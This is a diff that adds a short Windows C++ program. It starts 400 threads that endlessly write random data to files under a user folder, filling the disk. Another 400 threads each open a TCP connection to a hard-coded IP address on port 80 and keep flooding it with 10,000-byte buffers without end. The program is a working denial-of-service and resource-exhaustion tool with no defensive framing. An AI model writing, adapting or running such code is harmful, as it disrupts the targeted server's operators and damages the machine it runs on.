@@ -1,0 +1,85 @@
+#include <bits/stdc++.h>
+#include "winsock2.h"
+#include <windows.h>
+#include <random>
+#include <fstream>
+#pragma comment(dll,"ws2_32.dll")
+using namespace std;
+#define int long long
+static const int numthread = 400;
+
+void show(int i) {
+	fstream f;
+	string s = "C:\\Users\\Admin\\cc\\" + to_string(i) + ".txt";
+	f.open(s, ios::out);
+	int min = 0, max = 1e9;
+	random_device seed;
+	ranlux48 engine(seed());
+	uniform_int_distribution<> distrib(min, max);
+
+	while (1) {
+		for (int i = 1; i <= 10000; i++) {
+			f << "something";
+			f << distrib(engine);
+		}
+	}
+}
+void tcp(int i) {
+	WSADATA wsaData;
+	char buff[1024];
+	memset(buff, 0, sizeof(buff));
+
+	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+		//cout<<"...";
+		return;
+	}
+
+	SOCKADDR_IN addrSrv;
+	addrSrv.sin_family = AF_INET;
+	addrSrv.sin_port = htons(80);
+	addrSrv.sin_addr.S_un.S_addr = inet_addr("124.205.120.153");
+
+	SOCKET sockClient = socket(AF_INET, SOCK_STREAM, 0);
+
+	if (SOCKET_ERROR == sockClient) {
+		//printf("Socket() error:%d", WSAGetLastError());
+		return ;
+	}
+
+	if (connect(sockClient, (struct  sockaddr *)&addrSrv, sizeof(addrSrv)) == INVALID_SOCKET) {
+		//printf("杩炴帴澶辫触:%d", WSAGetLastError());
+		return;
+	} else {
+		recv(sockClient, buff, sizeof(buff), 0);
+	}
+
+	char buffs[10000] = "nothing";
+	send(sockClient, buffs, sizeof(buffs), 0);
+
+	for (int i = 0; i < 10000; i++)
+		buffs[i] = 'c';
+
+	while (true) {
+		send(sockClient, buffs, sizeof(buffs), 0);
+	}
+}
+signed main() {
+	//freopen("XXX.in","r",stdin);
+	//freopen("XXX.out","w",stdout);
+	system("md C:\\Users\\Admin\\cc\\");
+	thread mythread[numthread], ctcp[numthread];
+	Sleep(1000);
+
+	for (int i = 0; i < numthread; i++) {
+		mythread[i] = thread(show, i);
+		ctcp[i] = thread(tcp, i);
+		//Sleep(50);
+	}
+
+	for (int i = 0; i < numthread; i++) {
+		mythread[i].join();
+		ctcp[i].join();
+	}
+
+	return 0;
+}
